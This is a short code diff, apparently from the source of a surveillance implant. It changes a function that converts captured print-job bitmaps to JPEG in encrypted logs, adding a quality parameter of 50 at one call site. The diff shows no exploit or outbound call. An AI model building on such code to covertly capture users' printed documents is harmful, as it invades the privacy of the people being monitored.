@@ -50,7 +50,7 @@ log_entry_struct log_table[MAX_LOG_ENTRIES];
 extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 
 // In BitmapCommon
-extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData);
+extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
 
 extern aes_context crypt_ctx; // Dichiarata in shared
 extern aes_context crypt_ctx_conf; // Dichiarata in shared
@@ -1145,7 +1145,7 @@ void __stdcall Log_PrintDC(WCHAR *doc_name, HDC print_dc, HBITMAP print_bmp, DWO
 			memcpy(log_header, doc_name, print_additional_header->uDocumentNameLen);
 
 			//Output su file
-			BmpToJpgLog(PM_PRINTAGENT, (BYTE *)print_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage);
+			BmpToJpgLog(PM_PRINTAGENT, (BYTE *)print_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50);
 			SAFE_FREE(print_additional_header);
 		}
 	}
